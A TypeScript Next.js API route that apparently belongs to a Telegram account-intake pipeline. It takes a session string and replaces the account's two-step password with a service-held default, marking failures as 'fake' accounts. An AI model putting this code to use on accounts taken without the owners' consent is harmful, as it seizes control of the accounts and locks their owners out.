/**
 * Step 5: Setup Master Password
 * Corresponds to: O → P/Q → R in flowchart
 * - If account has existing password: Reset to default
 * - If no password: Set default master password
 */

import { NextRequest, NextResponse } from 'next/server'
import { getCollection, Collections } from '@/lib/mongodb/client'
import { setMasterPassword } from '@/lib/telegram/auth'
import { ObjectId } from 'mongodb'

// Get default master password from settings
async function getDefaultMasterPassword(): Promise<string> {
  const settings = await getCollection(Collections.SETTINGS)
  const setting = await settings.findOne({ setting_key: 'default_master_password' })
  
  if (setting && setting.setting_value) {
    return setting.setting_value
  }
  
  // If no setting exists, generate and store a strong default password
  const defaultPassword = `MP_${Date.now()}_${Math.random().toString(36).substring(2, 15)}`
  
  await settings.updateOne(
    { setting_key: 'default_master_password' },
    { 
      $setOnInsert: { 
        setting_key: 'default_master_password', 
        setting_value: defaultPassword,
        created_at: new Date() 
      } 
    },
    { upsert: true }
  )
  
  return defaultPassword
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { accountId, sessionString, currentPassword } = body

    if (!accountId || !sessionString) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    console.log(`[SetupPassword] Setting up master password for account: ${accountId}`)

    const accounts = await getCollection(Collections.ACCOUNTS)
    const account = await accounts.findOne({ _id: new ObjectId(accountId) })

    if (!account) {
      return NextResponse.json(
        { error: 'Account not found' },
        { status: 404 }
      )
    }

    // Get default master password
    const masterPassword = await getDefaultMasterPassword()
    const hadExistingPassword = account.had_existing_password || !!currentPassword

    console.log(`[SetupPassword] Account ${hadExistingPassword ? 'has' : 'does not have'} existing password`)

    // Set or change master password
    const setPasswordResult = await setMasterPassword(
      sessionString,
      masterPassword,
      hadExistingPassword ? currentPassword : undefined
    )

    if (!setPasswordResult.success) {
      // Failed to set password = Likely a fake account
      console.log(`[SetupPassword] ❌ Failed to set master password: ${setPasswordResult.error}`)
      
      await accounts.updateOne(
        { _id: new ObjectId(accountId) },
        {
          $set: {
            status: 'rejected',
            rejection_reason: 'Fake Account - Unable to set master password',
            rejected_at: new Date(),
            updated_at: new Date(),
          }
        }
      )

      return NextResponse.json({
        success: false,
        rejected: true,
        reason: 'Fake Account - Unable to set master password',
        error: setPasswordResult.error,
      }, { status: 400 })
    }

    // Password set successfully
    console.log(`[SetupPassword] ✅ Master password ${hadExistingPassword ? 'changed' : 'set'} successfully`)
    
    await accounts.updateOne(
      { _id: new ObjectId(accountId) },
      {
        $set: {
          status: 'checking_sessions',
          master_password_set: true,
          master_password_set_at: new Date(),
          had_existing_password: hadExistingPassword,
          updated_at: new Date(),
        }
      }
    )

    return NextResponse.json({
      success: true,
      passwordChanged: hadExistingPassword,
      message: `Master password ${hadExistingPassword ? 'changed' : 'set'} successfully`,
    })
  } catch (error: any) {
    console.error('[SetupPassword] Error:', error)
    return NextResponse.json(
      { error: error.message || 'Internal server error' },
      { status: 500 }
    )
  }
}
